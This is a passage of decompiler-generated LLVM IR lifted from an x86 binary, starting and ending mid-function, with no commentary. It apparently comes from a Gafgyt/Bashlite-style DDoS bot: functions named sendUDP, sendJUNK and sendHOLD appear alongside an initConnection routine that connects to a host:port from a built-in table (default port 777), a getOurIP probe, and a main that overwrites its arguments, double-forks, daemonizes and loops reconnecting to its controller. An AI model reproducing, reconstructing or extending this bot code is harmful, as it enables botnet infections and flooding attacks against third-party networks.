  %v0_804d3ee = phi i32 [ %v2_804d0bd, %dec_label_pc_804d0b2 ], [ %v2_804ce49, %dec_label_pc_804ce3e ], [ %v2_804cc44, %dec_label_pc_804cc39 ], [ %v2_804cac5, %dec_label_pc_804caba ], [ %v2_804d015, %dec_label_pc_804d020 ], [ %v2_804cd8b, %dec_label_pc_804cd96 ], [ %v2_804cc0c, %dec_label_pc_804cc17 ], [ %v2_804ca8d, %dec_label_pc_804ca98 ], [ %v2_804d3d1, %dec_label_pc_804d391 ], [ %v0_804d225, %dec_label_pc_804d225 ], [ %v2_804d09f, %dec_label_pc_804d094 ], [ %v2_804d080, %dec_label_pc_804d075 ], [ %v2_804d067, %dec_label_pc_804d05c ], [ %v2_804d04e, %dec_label_pc_804d043 ], [ %v2_804d035, %dec_label_pc_804d02a ], [ %v0_804cf81, %dec_label_pc_804cf81 ], [ %v2_804ce2a, %dec_label_pc_804ce1f ], [ %v2_804ce0f, %dec_label_pc_804ce04 ], [ %v2_804cdf6, %dec_label_pc_804cdeb ], [ %v2_804cddd, %dec_label_pc_804cdd2 ], [ %v2_804cdc4, %dec_label_pc_804cdb9 ], [ %v2_804cdab, %dec_label_pc_804cda0 ], [ %v0_804cd0c, %dec_label_pc_804cd0c ], [ %v2_804cc2c, %dec_label_pc_804cc21 ], [ %v0_804cb8d, %dec_label_pc_804cb8d ], [ %v2_804caad, %dec_label_pc_804caa2 ], [ %v3_804ca43, %dec_label_pc_804ca21 ], [ %v3_804c9d0, %dec_label_pc_804c9c0 ], [ %v2_804d3df, %dec_label_pc_804d3d8 ]
  %v0_804d3e4 = load i32, i32* @esp, align 4
  %v5_804d3e4 = icmp ugt i32 %v0_804d3e4, -285
  store i1 %v5_804d3e4, i1* %cf.global-to-local, align 1
  %v2_804d3ea = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d3ea, i32* @ebx, align 4
  store i32 %v0_804c971, i32* @esi, align 4
  store i32 %v0_804c970, i32* @edi, align 4
  ret i32 %v0_804d3ee

; uselistorder directives
  uselistorder i1 %v0_804d3c5, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_804d2de, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804d2b4, { 1, 0 }
  uselistorder i32 %v3_804d215, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %storemerge3, { 1, 0, 2 }
  uselistorder i32 %v2_804d115, { 1, 0 }
  uselistorder i32 %v2_804d107, { 1, 0 }
  uselistorder i32 %v2_804d0f4, { 1, 0 }
  uselistorder i32 %v2_804d0e1, { 1, 0 }
  uselistorder i32 %v2_804d0d1, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804d0bd, { 1, 0 }
  uselistorder i32 %v1_804d085, { 1, 0 }
  uselistorder i32 %v2_804d080, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804d067, { 1, 0, 2 }
  uselistorder i32 %v2_804d04e, { 1, 0, 2 }
  uselistorder i32 %v2_804d035, { 1, 0, 2 }
  uselistorder i1 %v0_804d009, { 1, 0 }
  uselistorder i32 %v3_804cf71, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0, 2 }
  uselistorder i32 %v2_804cea6, { 1, 0 }
  uselistorder i32 %v2_804ce93, { 1, 0 }
  uselistorder i32 %v2_804ce80, { 1, 0 }
  uselistorder i32 %v2_804ce6d, { 1, 0 }
  uselistorder i32 %v2_804ce5d, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804ce49, { 1, 0 }
  uselistorder i32 %v1_804ce2f, { 1, 0 }
  uselistorder i32 %v2_804ce2a, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v1_804ce14, { 1, 0 }
  uselistorder i32 %v2_804ce0f, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804cdf6, { 1, 0, 2 }
  uselistorder i32 %v2_804cddd, { 1, 0, 2 }
  uselistorder i32 %v2_804cdc4, { 1, 0, 2 }
  uselistorder i32 %v2_804cdab, { 1, 0, 2 }
  uselistorder i1 %v0_804cd7f, { 1, 0 }
  uselistorder i32 %v3_804ccfc, { 1, 0 }
  uselistorder i32 %v2_804cc7b, { 1, 0 }
  uselistorder i32 %v2_804cc68, { 1, 0 }
  uselistorder i32 %v2_804cc58, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804cc44, { 1, 0 }
  uselistorder i32 %v2_804cc2c, { 1, 0 }
  uselistorder i1 %v0_804cc00, { 1, 0 }
  uselistorder i32 %v3_804cb7d, { 1, 0 }
  uselistorder i32 %v2_804cafc, { 1, 0 }
  uselistorder i32 %v2_804cae9, { 1, 0 }
  uselistorder i32 %v2_804cad9, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804cac5, { 1, 0 }
  uselistorder i32 %v2_804caad, { 1, 0 }
  uselistorder i1 %v0_804ca81, { 1, 0 }
  uselistorder i1 %v0_804ca0e, { 1, 0 }
  uselistorder i1 %v0_804c9ad, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp121, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 5, 4, 1, 2, 3, 6, 8, 7, 9, 10, 11 }
  uselistorder i1* %cf.global-to-local, { 4, 5, 12, 6, 11, 7, 8, 9, 10, 13, 40, 14, 16, 15, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 68, 42, 44, 43, 1, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 81, 70, 72, 71, 2, 73, 74, 75, 76, 77, 78, 79, 80, 82, 94, 83, 85, 84, 3, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32* inttoptr (i32 -25 to i32*), { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @sendJUNK, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8052eb4.47 to i32), { 3, 4, 2, 5, 1, 6, 0, 7, 8, 9 }
  uselistorder i32* %arg2, { 2, 3, 1, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %arg1, { 0, 12, 6, 5, 11, 1, 10, 4, 9, 3, 8, 2, 7 }
  uselistorder label %dec_label_pc_804d3e4, { 28, 8, 9, 0, 10, 11, 12, 13, 14, 4, 15, 1, 16, 17, 18, 19, 20, 21, 5, 22, 2, 23, 6, 24, 3, 25, 7, 26, 27 }
  uselistorder label %dec_label_pc_804d334, { 1, 0 }
  uselistorder label %dec_label_pc_804d331, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d1af, { 1, 0 }
  uselistorder label %dec_label_pc_804d173, { 1, 0 }
  uselistorder label %dec_label_pc_804d142, { 1, 0 }
  uselistorder label %dec_label_pc_804d0ac, { 1, 0 }
  uselistorder label %dec_label_pc_804cf12, { 1, 0 }
  uselistorder label %dec_label_pc_804ced6, { 1, 0 }
  uselistorder label %dec_label_pc_804ccb2, { 1, 0 }
  uselistorder label %dec_label_pc_804cb33, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-520 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d3ef = load i32, i32* @ebp, align 4
  store i32 %v0_804d3ef, i32* %stack_var_-4, align 4
  %v4_804d3ef = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804d3ef, i32* @ebp, align 4
  %v2_804d3f8 = ptrtoint i32* %stack_var_-520 to i32
  %tmp11 = bitcast i32* %stack_var_-520 to i8*
  %v5_804d414 = call i32 @__GI_memset(i8* %tmp11, i32 0, i32 512)
  %v0_804d419 = load i8*, i8** @global_var_8055900.26, align 4
  %v2_804d41e = icmp eq i8* %v0_804d419, null
  br i1 %v2_804d41e, label %dec_label_pc_804d439, label %dec_label_pc_804d422

dec_label_pc_804d422:                             ; preds = %entry
  %v1_804d419 = ptrtoint i8* %v0_804d419 to i32
  %v2_804d42a = call i32 @__libc_close(i32 %v1_804d419)
  store i8* null, i8** @global_var_8055900.26, align 256
  br label %dec_label_pc_804d439

dec_label_pc_804d439:                             ; preds = %entry, %dec_label_pc_804d422
  %v0_804d439 = load i32, i32* @global_var_8055624.63, align 4
  %v1_804d43e = icmp eq i32 %v0_804d439, 0
  %v1_804d440 = icmp eq i1 %v1_804d43e, false
  br i1 %v1_804d440, label %dec_label_pc_804d44e, label %dec_label_pc_804d459

dec_label_pc_804d44e:                             ; preds = %dec_label_pc_804d439
  %v1_804d453 = add i32 %v0_804d439, 1
  br label %dec_label_pc_804d459

dec_label_pc_804d459:                             ; preds = %dec_label_pc_804d439, %dec_label_pc_804d44e
  %storemerge = phi i32 [ %v1_804d453, %dec_label_pc_804d44e ], [ 0, %dec_label_pc_804d439 ]
  store i32 %storemerge, i32* @global_var_8055624.63, align 4
  %v1_804d45e = mul i32 %storemerge, 4
  %v2_804d45e = add i32 %v1_804d45e, ptrtoint ([19 x i8]** @global_var_8055620.65 to i32)
  %v3_804d45e = inttoptr i32 %v2_804d45e to i32*
  %v4_804d45e = load i32, i32* %v3_804d45e, align 4
  store i32 %v4_804d45e, i32* @eax, align 4
  %v4_804d472 = call i32 @strcpy(i8* %tmp11, i32 %v4_804d45e)
  %v4_804d48f = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v1_804d494 = icmp eq i32 %v4_804d48f, 0
  br i1 %v1_804d494, label %dec_label_pc_804d4d3, label %dec_label_pc_804d498

dec_label_pc_804d498:                             ; preds = %dec_label_pc_804d459
  %v4_804d4a9 = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v1_804d4ae = add i32 %v4_804d4a9, 1
  %v2_804d4b2 = call i32 @atol(i32 %v1_804d4ae)
  %v4_804d4cb = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v5_804d4cb = inttoptr i32 %v4_804d4cb to i8*
  store i8 0, i8* %v5_804d4cb, align 1
  br label %dec_label_pc_804d4d3

dec_label_pc_804d4d3:                             ; preds = %dec_label_pc_804d459, %dec_label_pc_804d498
  %stack_var_-8.0 = phi i32 [ 777, %dec_label_pc_804d459 ], [ %v2_804d4b2, %dec_label_pc_804d498 ]
  %v4_804d4ea = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_804d4ef = inttoptr i32 %v4_804d4ea to i8*
  store i8* %v1_804d4ef, i8** @global_var_8055900.26, align 256
  %v5_804d516 = call i32 @connectTimeout(i32 %v4_804d4ea, i32 %v2_804d3f8, i32 %stack_var_-8.0, i32 30)
  %v1_804d51b = icmp eq i32 %v5_804d516, 0
  %. = zext i1 %v1_804d51b to i32
  %v2_804d53b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d53b, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8* %v0_804d419, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 0, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 0, 7, 8, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804d4d3, { 1, 0 }
  uselistorder label %dec_label_pc_804d459, { 1, 0 }
  uselistorder label %dec_label_pc_804d439, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d53d = load i32, i32* @ebp, align 4
  store i32 %v0_804d53d, i32* %stack_var_-4, align 4
  %v5_804d55d = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804d565 = icmp eq i32 %v5_804d55d, -1
  %v1_804d569 = icmp eq i1 %v13_804d565, false
  br i1 %v1_804d569, label %dec_label_pc_804d57a, label %dec_label_pc_804d758

dec_label_pc_804d57a:                             ; preds = %entry
  %v2_804d57a = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804d5a5 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8052f1c.66 to i32))
  %v3_804d5b4 = call i32 @htons(i16 53)
  %v5_804d5d5 = call i32 @__libc_connect(i32 %v5_804d55d, i32 %v2_804d57a, i32 16)
  %v13_804d5dd = icmp eq i32 %v5_804d5d5, -1
  %v1_804d5e1 = icmp eq i1 %v13_804d5dd, false
  br i1 %v1_804d5e1, label %dec_label_pc_804d5f2, label %dec_label_pc_804d758

dec_label_pc_804d5f2:                             ; preds = %dec_label_pc_804d57a
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804d5f9 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804d5fc = ptrtoint i32* %stack_var_-60 to i32
  %v5_804d60d = call i32 @__GI_getsockname(i32 %v5_804d55d, i32 %v2_804d5f9, i32 %v2_804d5fc)
  %v13_804d615 = icmp eq i32 %v5_804d60d, -1
  %v1_804d619 = icmp eq i1 %v13_804d615, false
  br i1 %v1_804d619, label %dec_label_pc_804d62a, label %dec_label_pc_804d758

dec_label_pc_804d62a:                             ; preds = %dec_label_pc_804d5f2
  %v5_804d641 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8052f24.67, i32 0, i32 0), i32 0)
  %v2_804d6a6 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804d6be34 = call i32 @fdgets(i32 %v2_804d6a6, i32 4096, i32 %v5_804d641)
  %v1_804d6c335 = icmp eq i32 %v5_804d6be34, 0
  %v1_804d6c537 = icmp eq i1 %v1_804d6c335, false
  br i1 %v1_804d6c537, label %dec_label_pc_804d64b, label %dec_label_pc_804d6c7

dec_label_pc_804d64b:                             ; preds = %dec_label_pc_804d62a, %dec_label_pc_804d685
  %v5_804d65c = call i32 @strstr(i32 %v2_804d6a6, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8052f34.68, i32 0, i32 0))
  %v1_804d661 = icmp eq i32 %v5_804d65c, 0
  br i1 %v1_804d661, label %dec_label_pc_804d685, label %dec_label_pc_804d673

dec_label_pc_804d670:                             ; preds = %dec_label_pc_804d673
  %v4_804d673 = ptrtoint i8* %storemerge5 to i32
  %v5_804d670 = add i32 %v4_804d673, 1
  %v22_804d670 = inttoptr i32 %v5_804d670 to i8*
  br label %dec_label_pc_804d673

dec_label_pc_804d673:                             ; preds = %dec_label_pc_804d64b, %dec_label_pc_804d670
  %storemerge5 = phi i8* [ %v22_804d670, %dec_label_pc_804d670 ], [ %stack_var_-4156, %dec_label_pc_804d64b ]
  %v2_804d676 = load i8, i8* %storemerge5, align 1
  %v10_804d679 = icmp eq i8 %v2_804d676, 9
  %v1_804d67b = icmp eq i1 %v10_804d679, false
  br i1 %v1_804d67b, label %dec_label_pc_804d670, label %dec_label_pc_804d67d

dec_label_pc_804d67d:                             ; preds = %dec_label_pc_804d673
  store i8 0, i8* %storemerge5, align 1
  br label %dec_label_pc_804d6c7

dec_label_pc_804d685:                             ; preds = %dec_label_pc_804d64b
  %v6_804d6a1 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804d6be = call i32 @fdgets(i32 %v2_804d6a6, i32 4096, i32 %v5_804d641)
  %v1_804d6c3 = icmp eq i32 %v5_804d6be, 0
  %v1_804d6c5 = icmp eq i1 %v1_804d6c3, false
  br i1 %v1_804d6c5, label %dec_label_pc_804d64b, label %dec_label_pc_804d6c7

dec_label_pc_804d6c7:                             ; preds = %dec_label_pc_804d62a, %dec_label_pc_804d685, %dec_label_pc_804d67d
  %v2_804d6cd = call i32 @__libc_close(i32 %v5_804d641)
  %v3_804d6d2 = load i8, i8* %stack_var_-4156, align 1
  %v4_804d6d9 = icmp eq i8 %v3_804d6d2, 0
  br i1 %v4_804d6d9, label %dec_label_pc_804d73f, label %dec_label_pc_804d6dd

dec_label_pc_804d6dd:                             ; preds = %dec_label_pc_804d6c7
  %v2_804d6e7 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804d6e7, i32* @eax, align 4
  %tmp32 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804d6f0 = call i32 @strcpy(i8* %tmp32, i32 %v2_804d6a6)
  %v5_804d70d = call i32 @ioctl(i32 %v5_804d55d, i32 35111, i32 %v2_804d6e7)
  %v2_804d724 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804d71b

dec_label_pc_804d71b:                             ; preds = %dec_label_pc_804d6dd, %dec_label_pc_804d71b
  %storemerge33 = phi i32 [ 0, %dec_label_pc_804d6dd ], [ %v4_804d736, %dec_label_pc_804d71b ]
  %v2_804d72a = add i32 %storemerge33, %v2_804d724
  %v1_804d72d = inttoptr i32 %v2_804d72a to i8*
  %v2_804d72d = load i8, i8* %v1_804d72d, align 1
  %v3_804d730 = add i32 %storemerge33, ptrtoint (i8** @global_var_8055910.69 to i32)
  %v4_804d730 = inttoptr i32 %v3_804d730 to i8*
  store i8 %v2_804d72d, i8* %v4_804d730, align 1
  %v4_804d736 = add nuw nsw i32 %storemerge33, 1
  %exitcond = icmp eq i32 %v4_804d736, 6
  br i1 %exitcond, label %dec_label_pc_804d73f, label %dec_label_pc_804d71b

dec_label_pc_804d73f:                             ; preds = %dec_label_pc_804d71b, %dec_label_pc_804d6c7
  %v2_804d745 = call i32 @__libc_close(i32 %v5_804d55d)
  br label %dec_label_pc_804d758

dec_label_pc_804d758:                             ; preds = %entry, %dec_label_pc_804d57a, %dec_label_pc_804d5f2, %dec_label_pc_804d73f
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_804d73f ], [ 0, %dec_label_pc_804d5f2 ], [ 0, %dec_label_pc_804d57a ], [ 0, %entry ]
  %v2_804d75e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d75e, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i8* %storemerge5, { 0, 2, 1 }
  uselistorder i32 %v2_804d6a6, { 1, 3, 2, 0 }
  uselistorder i32 %v5_804d641, { 1, 2, 0 }
  uselistorder i32 %v5_804d55d, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 3, 1, 0, 2 }
  uselistorder i32 (i32)* @__libc_close, { 31, 30, 1, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 10, 14, 13, 12, 11, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 3, 2, 0, 4, 1 }
  uselistorder i32 (i16)* @htons, { 1, 2, 12, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 (i32)* @inet_addr, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 6, 5, 4, 0, 3, 2, 1, 7 }
  uselistorder label %dec_label_pc_804d758, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d71b, { 1, 0 }
  uselistorder label %dec_label_pc_804d6c7, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804d673, { 1, 0 }
  uselistorder label %dec_label_pc_804d64b, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-5424 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804d760 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804d760, i32* %stack_var_-24, align 4
  %v5_804d771 = icmp ult i32* %stack_var_-24, inttoptr (i32 5400 to i32*)
  store i1 %v5_804d771, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5424, align 4
  %v3_804d784 = call i32 @__GI_time(i32* null)
  store i32 %v3_804d784, i32* @ebx, align 4
  %v0_804d78b = call i32 @__libc_getpid()
  %v1_804d790 = load i32, i32* @ebx, align 4
  %v2_804d790 = xor i32 %v1_804d790, %v0_804d78b
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804d790, i32* @eax, align 4
  %v4_804d792 = inttoptr i32 %v2_804d790 to i8*
  store i8* %v4_804d792, i8** %stack_var_-5424, align 4
  %v2_804d795 = call i32 @srand(i32 %v2_804d790)
  store i8* null, i8** %stack_var_-5424, align 4
  %v3_804d7a1 = call i32 @__GI_time(i32* null)
  store i32 %v3_804d7a1, i32* @ebx, align 4
  %v0_804d7a8 = call i32 @__libc_getpid()
  %v1_804d7ad = load i32, i32* @ebx, align 4
  %v2_804d7ad = xor i32 %v1_804d7ad, %v0_804d7a8
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d7af = inttoptr i32 %v2_804d7ad to i8*
  store i8* %v4_804d7af, i8** %stack_var_-5424, align 4
  %v2_804d7b2 = call i32 @init_rand(i32 %v2_804d7ad)
  %v0_804d7b7 = call i32 @getOurIP()
  store i32 %v2_804d760, i32* %edx.global-to-local, align 4
  %v1_804d7c2 = add i32 %v2_804d760, 4
  %v2_804d7c2 = inttoptr i32 %v1_804d7c2 to i32*
  %v3_804d7c2 = load i32, i32* %v2_804d7c2, align 4
  %v1_804d7c5 = inttoptr i32 %v3_804d7c2 to i32*
  %v2_804d7c5 = load i32, i32* %v1_804d7c5, align 4
  %v4_804d7d5 = inttoptr i32 %v2_804d7c5 to i8*
  store i32 %v2_804d7c5, i32* @edi, align 4
  %v3_804d7db = call i32 @_strlen(i8* %v4_804d7d5)
  store i32 %v3_804d7db, i32* %edx.global-to-local, align 4
  %v3_804d7ea = load i32, i32* %v2_804d7c2, align 4
  %v1_804d7ed = inttoptr i32 %v3_804d7ea to i32*
  %v2_804d7ed = load i32, i32* %v1_804d7ed, align 4
  %v4_804d7fb = inttoptr i32 %v2_804d7ed to i8*
  store i8* %v4_804d7fb, i8** %stack_var_-5424, align 4
  %v7_804d7fe = call i32 @strncpy(i8* %v4_804d7fb, i32 ptrtoint ([6 x i8]* @global_var_8052f3f.70 to i32), i32 %v3_804d7db)
  br label %dec_label_pc_804d857

dec_label_pc_804d80c:                             ; preds = %dec_label_pc_804d857
  %v2_804d80f = mul i32 %storemerge22, 4
  %v4_804d818 = load i32, i32* %v2_804d7c2, align 4
  %v5_804d818 = add i32 %v4_804d818, %v2_804d80f
  %v10_804d818 = icmp ult i32 %v5_804d818, %v2_804d80f
  store i1 %v10_804d818, i1* %cf.global-to-local, align 1
  %v1_804d81b = inttoptr i32 %v5_804d818 to i32*
  %v2_804d81b = load i32, i32* %v1_804d81b, align 4
  %v4_804d82b = inttoptr i32 %v2_804d81b to i8*
  %v3_804d831 = call i32 @_strlen(i8* %v4_804d82b)
  store i32 %v3_804d831, i32* %edx.global-to-local, align 4
  %v4_804d846 = load i32, i32* %v2_804d7c2, align 4
  %v5_804d846 = add i32 %v4_804d846, %v2_804d80f
  %v10_804d846 = icmp ult i32 %v5_804d846, %v2_804d80f
  store i1 %v10_804d846, i1* %cf.global-to-local, align 1
  %v1_804d849 = inttoptr i32 %v5_804d846 to i32*
  %v2_804d849 = load i32, i32* %v1_804d849, align 4
  %v1_804d84b = inttoptr i32 %v2_804d849 to i8*
  store i32 %v2_804d849, i32* @edi, align 4
  %v1_804d850 = and i32 %v2_804d849, -256
  %v5_804d852 = call i8* @_memset(i8* %v1_804d84b, i32 %v1_804d850, i32 %v3_804d831)
  %v4_804d854 = add i32 %storemerge22, 1
  br label %dec_label_pc_804d857

dec_label_pc_804d857:                             ; preds = %entry, %dec_label_pc_804d80c
  %storemerge22 = phi i32 [ %v4_804d854, %dec_label_pc_804d80c ], [ 1, %entry ]
  %v3_804d860 = load i32, i32* %stack_var_4, align 4
  %v9_804d860 = icmp ult i32 %storemerge22, %v3_804d860
  store i1 %v9_804d860, i1* %cf.global-to-local, align 1
  %v5_804d862 = icmp slt i32 %storemerge22, %v3_804d860
  br i1 %v5_804d862, label %dec_label_pc_804d80c, label %dec_label_pc_804d864

dec_label_pc_804d864:                             ; preds = %dec_label_pc_804d857
  %v0_804d864 = call i32 @getCoresAmount()
  store i32 %v0_804d864, i32* @esi, align 4
  %v0_804d86b = call i32 @getEndianness()
  store i32 %v0_804d86b, i32* @ebx, align 4
  %v0_804d872 = call i32 @getBuild()
  %v0_804d87f = load i32, i32* @esi, align 4
  %v0_804d883 = load i32, i32* @ebx, align 4
  %v5_804d883 = inttoptr i32 %v0_804d883 to i8*
  %v5_804d887 = inttoptr i32 %v0_804d872 to i8*
  store i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_8052f54.73, i32 0, i32 0), i8** %stack_var_-5424, align 4
  %v16_804d89a = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_8052f54.73, i32 0, i32 0), i8* bitcast (i32* @global_var_8052f4b.72 to i8*), i8* %v5_804d887, i8* %v5_804d883, i32 %v0_804d87f, i8* bitcast (i8** @global_var_8052f45.71 to i8*))
  %v0_804d89f = load i8*, i8** %stack_var_-5424, align 4
  %v1_804d89f = ptrtoint i8* %v0_804d89f to i32
  %v2_804d89f = call i32 @__libc_fork(i32 %v1_804d89f)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d8a7 = icmp eq i32 %v2_804d89f, 0
  br i1 %v4_804d8a7, label %dec_label_pc_804d8d9, label %dec_label_pc_804d8d3.thread

dec_label_pc_804d8d3.thread:                      ; preds = %dec_label_pc_804d864
  %v2_804d8b5 = ptrtoint i32* %stack_var_-92 to i32
  %v4_804d8bf = inttoptr i32 %v2_804d89f to i8*
  store i8* %v4_804d8bf, i8** %stack_var_-5424, align 4
  %v6_804d8c2 = call i32 @__libc_waitpid(i32 %v2_804d89f, i32 %v2_804d8b5, i32 0)
  store i32 %v6_804d8c2, i32* @eax, align 4
  store i8* null, i8** %stack_var_-5424, align 4
  %v2_804d8ce = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d8f3

dec_label_pc_804d8d9:                             ; preds = %dec_label_pc_804d864
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804d8d9 = load i8*, i8** %stack_var_-5424, align 4
  %v1_804d8d9 = ptrtoint i8* %v0_804d8d9 to i32
  %v2_804d8d9 = call i32 @__libc_fork(i32 %v1_804d8d9)
  store i32 %v2_804d8d9, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d8e1 = icmp eq i32 %v2_804d8d9, 0
  br i1 %v4_804d8e1, label %dec_label_pc_804d8f3, label %dec_label_pc_804d8e7

dec_label_pc_804d8e7:                             ; preds = %dec_label_pc_804d8d9
  store i8* null, i8** %stack_var_-5424, align 4
  %v2_804d8ee = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804d8f3

dec_label_pc_804d8f3:                             ; preds = %dec_label_pc_804d8d3.thread, %dec_label_pc_804d8d9, %dec_label_pc_804d8e7
  %v0_804d8f3 = call i32 @__GI_setsid()
  store i8* bitcast (i32* @global_var_8052f82.74 to i8*), i8** %stack_var_-5424, align 4
  %v2_804d8ff = call i32 @chdir(i32 ptrtoint (i32* @global_var_8052f82.74 to i32))
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-5424, align 4
  %v4_804d913 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_804e181 = ptrtoint i32* %stack_var_-5252 to i32
  %tmp113 = bitcast i32* %stack_var_-5252 to i8*
  %v1_804de03 = or i32 %v2_804e181, 1
  %v5_804de38 = inttoptr i32 %v1_804de03 to i8*
  %tmp114 = bitcast i8** %stack_var_-36 to i32*
  %v2_804df86 = ptrtoint i32* %stack_var_-1156 to i32
  %tmp115 = bitcast i32* %stack_var_-1156 to i8*
  br label %dec_label_pc_804d91a

dec_label_pc_804d91a:                             ; preds = %dec_label_pc_804d923, %dec_label_pc_804e181, %dec_label_pc_804d8f3
  %v0_804d91a = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d91f = icmp eq i32 %v0_804d91a, 0
  br i1 %v1_804d91f, label %dec_label_pc_804d94d, label %dec_label_pc_804d923

dec_label_pc_804d923:                             ; preds = %dec_label_pc_804d91a
  store i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_8052f84.75, i32 0, i32 0), i8** %stack_var_-5424, align 4
  %v9_804d93a = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_8052f84.75, i32 0, i32 0), i8* bitcast (i32* @global_var_8052f4b.72 to i8*), i8* bitcast (i8** @global_var_8052f45.71 to i8*))
